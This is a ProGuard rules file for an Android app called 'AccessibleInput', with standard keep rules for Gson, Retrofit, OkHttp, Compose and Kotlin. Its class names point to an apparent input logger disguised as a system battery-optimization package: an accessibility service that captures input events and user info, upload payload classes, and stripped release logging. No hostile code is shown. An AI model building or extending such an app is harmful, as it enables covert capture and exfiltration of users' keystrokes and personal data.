# ============================================================
# AccessibleInput ProGuard Rules
# ============================================================

# ---------- Android 组件 (AndroidManifest 引用) ----------
-keep class com.android.batteryoptimization.MainActivity { *; }
-keep class com.android.batteryoptimization.InputAccessibilityService { *; }

# ---------- Gson 数据类 (JSON 序列化/反序列化) ----------
-keep class com.android.batteryoptimization.InputEvent { *; }
-keep class com.android.batteryoptimization.UserInfo { *; }
-keep class com.android.batteryoptimization.network.UploadRequest { *; }
-keep class com.android.batteryoptimization.network.UploadResponse { *; }
-keep class com.android.batteryoptimization.network.UserInfoPayload { *; }
-keep class com.android.batteryoptimization.network.EventPayload { *; }

# ---------- Retrofit API 接口 ----------
-keep,allowobfuscation interface com.android.batteryoptimization.network.UploadApi

# ---------- Kotlin 协程 ----------
-keepnames class kotlinx.coroutines.internal.MainDispatcherFactory {}
-keepnames class kotlinx.coroutines.CoroutineExceptionHandler {}
-keepclassmembers class kotlinx.coroutines.** {
    volatile <fields>;
}

# ---------- Gson 通用规则 ----------
-keepattributes Signature
-keepattributes *Annotation*
-dontwarn sun.misc.**
-keep class com.google.gson.** { *; }
-keep class * implements com.google.gson.TypeAdapterFactory
-keep class * implements com.google.gson.JsonSerializer
-keep class * implements com.google.gson.JsonDeserializer

# Gson 使用 TypeToken 时需要保留泛型信息
-keepclassmembers,allowobfuscation class * {
    @com.google.gson.annotations.SerializedName <fields>;
}

# ---------- OkHttp ----------
-dontwarn okhttp3.**
-dontwarn okio.**
-keep class okhttp3.** { *; }
-keep interface okhttp3.** { *; }

# ---------- Retrofit ----------
-keepattributes Exceptions
-keepattributes Signature
-keepattributes *Annotation*
-keep class retrofit2.** { *; }
-keepclasseswithmembers class * {
    @retrofit2.http.* <methods>;
}

# ---------- Jetpack Compose ----------
-keepclassmembers class * {
    @androidx.compose.runtime.Composable <methods>;
}
-keepclassmembers class * {
    @androidx.compose.runtime.Stable <methods>;
}

# ---------- 保留 R 文件中的资源 ID ----------
-keepclassmembers class **.R$* {
    public static <fields>;
}

# ---------- 保留枚举类 ----------
-keepclassmembers enum * {
    public static **[] values();
    public static ** valueOf(java.lang.String);
}

# ---------- 保留 Kotlin 伴生对象 ----------
-keepclassmembers class * {
    static *** INSTANCE;
    volatile <fields>;
}

# ---------- 保留 Kotlin 元数据 (Compose 需要) ----------
-keep class kotlin.Metadata { *; }
-dontwarn kotlin.**

# ---------- 移除日志 (Release 包去掉 Log 输出) ----------
-assumenosideeffects class android.util.Log {
    public static boolean isLoggable(java.lang.String, int);
    public static int v(...);
    public static int d(...);
    public static int i(...);
    public static int w(...);
    public static int e(...);
}
